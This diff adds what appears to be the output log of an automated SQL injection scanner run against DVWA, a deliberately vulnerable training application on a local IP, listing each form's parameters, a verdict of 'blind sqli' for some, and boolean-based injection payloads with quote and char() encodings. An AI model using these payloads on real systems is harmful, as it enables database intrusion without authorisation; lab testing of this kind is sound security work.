@@ -1,0 +1,79 @@
+Target: http://192.168.42.1/dvwa/ (GET)
+
+---
+URL:http://192.168.42.1/dvwa/vulnerabilities/brute/ (POST)
+VulnName: blind sqli
+Query: {'username': 'cntvalue', 'user_token': 'e022298dcd65f856f2554f41e2bd8b6a', 'Login': 'Login', 'password': 'cntvalue'}
+Payload: '+and+'99091'='99091
+'+and+'75033'='75033
+'+or+56818=56818#
+'+and+'47453'='47454
+Advice: use orm
+Database: unknown
+---
+---
+URL:http://192.168.42.1/dvwa/vulnerabilities/csrf/ (GET)
+VulnName: 
+Query: {'password_new': 'cntvalue', 'password_current': 'cntvalue', 'password_conf': 'cntvalue', 'Change': 'Change', 'user_token': '52f738ee0d080f3b1bcb572dceda77c3'}
+Payload: '+and+'99091'='99091
+'+and+'75033'='75033
+'+or+56818=56818#
+'+and+'47453'='47454
+Advice: 
+Database: unknown
+---
+---
+URL:http://192.168.42.1/dvwa/vulnerabilities/sqli/ (GET)
+VulnName: 
+Query: {'user_token': '6081c1656c4b90f1b3b1b9f34a3e3206', 'id': 'cntvalue', 'Submit': 'Submit'}
+Payload: +and+7138=7138
++and+96348=96348
++or+15242=15242#
++and+76558=76559
+Advice: 
+Database: unknown
+---
+---
+URL:http://192.168.42.1/dvwa/vulnerabilities/xss_s/ (POST)
+VulnName: blind sqli
+Query: {'user_token': '2d284bfba5b143d18e36503a33fef57e', 'btnSign': 'Sign Guestbook', 'mtxMessage': '', 'txtName': 'cntvalue'}
+Payload: char(0x27)+and+char(0x27)4111char(0x27)=char(0x27)4111
+char(0x27)+and+char(0x27)85884char(0x27)=char(0x27)85884
+char(0x27)+or+39827=39827#
+char(0x27)+and+char(0x27)5045char(0x27)=char(0x27)5046
+Advice: use orm
+Database: unknown
+---
+---
+URL:http://192.168.42.1/dvwa/vulnerabilities/captcha/ (POST)
+VulnName: 
+Query: {'password_current': 'cntvalue', 'password_conf': 'cntvalue', 'recaptcha_response_field': 'manual_challenge', 'recaptcha_challenge_field': '', 'password_new': 'cntvalue', 'user_token': 'f98c703543431a12b4270c44620c244b', 'step': '1', 'Change': 'Change'}
+Payload: +and+7138=7138
++and+96348=96348
++or+15242=15242#
++and+76558=76559
+Advice: 
+Database: unknown
+---
+---
+URL:http://192.168.42.1/dvwa/setup.php (POST)
+VulnName: 
+Query: {'user_token': 'd372e07e4b205a579e80bce633f854a3', 'create_db': 'Create / Reset Database'}
+Payload: char(0x27)	and	char(0x27)83795char(0x27)=char(0x27)83795
+char(0x27)	and	char(0x27)42904char(0x27)=char(0x27)42904
+char(0x27)	or	60077=60077#
+char(0x27)	and	char(0x27)42156char(0x27)=char(0x27)42157
+Advice: 
+Database: unknown
+---
+---
+URL:http://192.168.42.1/dvwa/vulnerabilities/sqli_blind/ (GET)
+VulnName: 
+Query: {'user_token': '86964a93b11c74014a7021a81ee0c925', 'id': 'cntvalue', 'Submit': 'Submit'}
+Payload: char(0x22)+and+char(0x22)29172char(0x22)=char(0x22)29172
+char(0x22)+and+char(0x22)69582char(0x22)=char(0x22)69582
+char(0x22)+or+67373=67373#
+char(0x22)+and+char(0x22)24709char(0x22)=char(0x22)24710
+Advice: 
+Database: unknown
+---
